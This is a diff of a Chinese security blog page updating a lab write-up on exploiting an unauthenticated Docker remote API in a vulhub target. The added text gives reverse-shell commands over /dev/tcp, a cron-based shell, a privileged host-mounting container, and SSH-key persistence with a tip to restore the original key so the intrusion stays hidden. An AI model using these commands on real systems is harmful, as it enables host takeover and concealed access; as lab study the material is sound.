@@ -388,21 +388,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-12-07
+                    2021-12-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    407
+                    822
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -434,9 +434,10 @@
 <p>环境搭建:</p>
 <p>靶机：vulhub中docker未授权环境</p>
 <p>攻击者：docker&amp;docker-compose</p>
+<p>先访问2375端口看是否有<code>page not found</code>回显，有则说明存在未授权</p>
 <p><img src="https://s2.loli.net/2021/12/07/yhJFfPCQaUXkLeg.png" alt="image-20211207151316992"></p>
 <p><img src="https://s2.loli.net/2021/12/07/AlqpV5Jsrt6uxfN.png" alt="image-20211207151404268"></p>
-<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>列出靶机的镜像和容器</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>列出靶机的镜像和容器</p>
 <p><code>docker -H tcp://靶机:2375 images</code></p>
 <blockquote>
 <p>这里的镜像是开启的环境中的镜像</p>
@@ -446,15 +447,53 @@
 <p><code>docker -H tcp://靶机:2375 run -it -v /:/mnt 镜像id sh</code></p>
 <p><img src="https://s2.loli.net/2021/12/07/XQ3eDVZK7dYg5fU.png" alt="image-20211207160516702"></p>
 <p>直接反弹shell&amp;定时任务反弹shell</p>
+<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
 <p><img src="https://s2.loli.net/2021/12/07/slMn9cbCPkUYwL8.png" alt="image-20211207164406870"></p>
 <p>已经确认防火墙关闭并且端口开放，但是仍然反弹不了</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1 </code></p>
 <p>而通过宿主机直接反弹shell没有问题，再次确认了端口和防火墙没有问题</p>
 <p><img src="https://s2.loli.net/2021/12/07/Qaz16sZ7xHypCdI.png" alt="image-20211207164928079"></p>
-<h3 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h3><ul>
+<p>卡住了。</p>
+<p>在h0ld1rs大佬的指点下了解到了linux下的==<strong>shell种类</strong>==：</p>
+<p>使⽤docker搭建的环境进入容器内部时没有bash只能以sh进⼊</p>
+<blockquote>
+<p>sh、csh、tcsh、ash、bash</p>
+<p>还有一些其他的shell</p>
+<p>csh，Bill Joy大神写的，语法类似于C语言</p>
+<p>tcsh，csh的增强版，FreeBSD中的默认Shell</p>
+<p>ksh，AIX中的默认Shell</p>
+<p>dash，新版本Debian/Ubuntu的默认Shell</p>
+</blockquote>
+<p>简单来说，bash是linux中默认shell，sh是Unix中的标准shell，bash兼容sh（sh编写的shell代码可以直接在bash中使用）</p>
+<h4 id="查看linux中可用shell"><a href="#查看linux中可用shell" class="headerlink" title="查看linux中可用shell"></a>查看linux中可用shell</h4><p><code>cat /etc/shells</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/WItSFCV4AK8iPLv.png" alt="image-20211208143514687"></p>
+<h5 id="使用sh反弹shell"><a href="#使用sh反弹shell" class="headerlink" title="使用sh反弹shell"></a>使用sh反弹shell</h5><p>未成功</p>
+<blockquote>
+<p>这里回滚了一下服务器开启靶场后没有镜像了，直接使用rce的payload</p>
+</blockquote>
+<p>直接rce的payload</p>
+<p><code>docker -H ip:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</code></p>
+<h5 id="公私钥提权"><a href="#公私钥提权" class="headerlink" title="公私钥提权"></a>公私钥提权</h5><p>攻击者生成一对公私钥</p>
+<p><code> ssh-keygen -t rsa</code></p>
+<p>输入密钥名和密码</p>
+<p><img src="https://s2.loli.net/2021/12/08/xQs1WODUdo7pvXz.png" alt="image-20211208161713009"></p>
+<p>写入位于<code>/root/.ssh</code>目录下的公钥文件</p>
+<p><img src="https://s2.loli.net/2021/12/08/kXoQTfMKxCIYgLq.png" alt="image-20211208161522638"></p>
+<p>使用私钥登录</p>
+<p><code>ssh -i 私钥文件 root@公钥文件所在ip</code></p>
+<p>ps:</p>
+<p>这里可以先保存下对方原来的公钥，等利用公私钥登录权限维持后再给对方换回去，以隐匿操作</p>
+<h4 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h4><ul>
+<li>docker中进入的容器有一部分使用的是sh的shell</li>
+<li>反弹shell先要在vps上开启监听</li>
+<li>挂载之后也没有找到root/.ssh目录下的公钥文件</li>
+</ul>
+<h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><h3 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h3><ul>
 <li>禁止出站ip（只允许访问特定ip）</li>
 <li>禁止出站端口（只允许访问特定端口）</li>
 <li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
 <li>反弹命令不存在或是当前用户无权调用bash</li>
+<li>可能不是使用的bash、而是sh或其他</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/105906432">反弹shell失败的几种原因</a></p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
@@ -570,18 +609,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/12/07/docker%E9%80%83%E9%80%B8/">
+                <a href="/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="docker逃逸">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="docker remote api未授权访问">
                         
-                        <span class="card-title">docker逃逸</span>
+                        <span class="card-title">docker remote api未授权访问</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -591,9 +629,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-07
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-08
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -602,7 +640,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -847,7 +884,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.2k</span>&nbsp;字
+                class="white-color">39.4k</span>&nbsp;字
             
             
             
